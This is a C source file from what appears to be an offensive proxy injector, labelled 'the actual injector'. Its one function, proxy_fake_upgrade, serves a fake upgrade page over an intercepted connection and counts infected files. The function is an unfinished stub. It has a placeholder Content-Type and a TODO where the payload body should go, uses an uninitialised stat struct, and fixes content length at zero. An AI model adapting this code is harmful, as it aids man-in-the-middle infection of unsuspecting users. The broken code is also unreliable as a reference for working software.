/*
    MODULE -- proxy module (the actual injector)

    Copyright (C) Alberto Ornaghi

    $Id: proxy_replace.c 3560 2011-06-07 15:00:02Z alor $
*/

#include <main.h>
#include <proxy.h>
#include <threads.h>
#include <file.h>
#include <match.h>
#include <match_request.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <signal.h>
#include <bio_replacer.h>

/* globals */


/* protos */

int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file, char *tag, char *host);

/************************************************/

int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file,  char *tag, char *host)
{
   char data[READ_BUFF_SIZE];
   struct stat st;
   size_t content_length = 0;
   char ipa_url[MAX_URL];

   /* calculate and replace the IPA_URL in the file */
   snprintf(ipa_url, MAX_URL - 1, "http://%s.%s", tag, host);

   DEBUG_MSG(D_INFO, "Sending fake upgrade page [%s] len [%d]", file, st.st_size);


   /* prepare the HTTP header */
   sprintf(data, "HTTP/1.0 200 OK\r\n"
       "Content-Length: %u\r\n"
       "Content-Type: XXXXXX" /* Content-Type: */
       "Connection: close\r\n"
       "\r\n", (u_int)content_length);

   /* send the headers to the client */
   BIO_write(*cbio, data, strlen(data));

   /* send the body to the client */
   // TODO: guido :)

   /* update the stats */
   GBL_STATS->inf_files++;

   return ESUCCESS;
}


/* EOF */

// vim:ts=3:expandtab

